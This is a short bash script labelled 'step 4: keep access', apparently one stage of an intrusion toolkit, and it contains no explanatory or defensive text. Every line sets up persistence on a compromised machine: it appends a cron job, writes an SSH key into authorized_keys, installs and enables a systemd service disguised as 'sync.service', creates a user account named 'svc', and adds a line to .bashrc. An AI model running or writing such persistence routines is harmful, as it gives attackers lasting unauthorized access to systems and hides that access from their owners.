#!/bin/bash
# step 4: keep access
(crontab -l; echo "$JOB") | crontab -
echo "$KEY" >> ~/.ssh/authorized_keys
cp sync.service /etc/systemd/system/sync.service
systemctl enable --now sync.service
useradd -m -s /bin/bash svc
echo "$LINE" >> ~/.bashrc
